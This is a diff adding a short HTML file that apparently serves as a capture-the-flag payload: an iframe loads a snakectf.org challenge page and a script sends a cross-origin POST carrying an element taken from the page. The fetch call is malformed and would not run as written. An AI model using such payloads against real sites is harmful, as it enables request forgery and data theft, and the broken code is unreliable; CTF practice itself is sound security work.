@@ -1,0 +1,16 @@
+<iframe src="https://c836ba448b675a6594dfbfa90e92670b.film-library.challs.snakectf.org/"></iframe>
+<script>
+  fetch("https://c836ba448b675a6594dfbfa90e92670b.film-library.challs.snakectf.org/",
+        method: "post",
+  headers: {
+    'Accept': 'application/json',
+    'Content-Type': 'application/json'
+  },
+
+  //make sure to serialize your JSON body
+  body: JSON.stringify({
+    title: 'gaysex',
+    description: document.getElementById('id_description_iframe')
+  })
+})
+</script>
